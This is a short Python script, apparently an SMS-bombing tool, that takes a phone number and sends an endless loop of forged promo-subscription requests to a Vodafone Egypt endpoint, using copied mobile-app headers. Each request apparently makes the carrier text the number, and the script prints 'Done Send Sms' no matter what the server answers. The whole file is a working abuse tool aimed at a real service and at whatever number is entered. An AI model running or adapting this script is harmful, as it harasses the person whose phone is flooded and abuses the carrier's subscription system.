import requests 
number=input ('Enter Phone Number  :  ')
while True:
    url='http://smart.vodafone.com.eg/promo/landing/vflive/playwin/min/vodafone_Games_AR.html'

    headers={'Host': 'vodafone-eg-lcm.mondiamedia.com',

'Connection': 'keep-alive',
'Content-Length': '339',

'Pragma': 'no-cache',
'Cache-Control': 'no-cache',
'Accept': 'application/json',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Content-Type': 'application/json',
'Origin': 'http://smart.vodafone.com.eg',
'X-Requested-With': 'com.emeint.android.myservices',

'Referer': 'http://smart.vodafone.com.eg/promo/landing/vflive/playwin/min/vodafone_Games_AR.html?pcid=130',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar,ar-EG;q=0.9,ar-AE;q=0.8,en-GB;q=0.7,en-US;q=0.6,en;q=0.5'}

    
    data={"msisdn":number,"subscriptionTypeId":"822","operatorId":"10","promoter":"130","userAgent":"Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36","eventId":"0","redirectUrl":"http://playwin.vodafone.com.eg?lang=ar","sc":21}

    i=requests.post (url,headers=headers, data=data).text
 #   print (i)
    if True:
        print ('Done Send Sms')
    else :
        print ('Error')
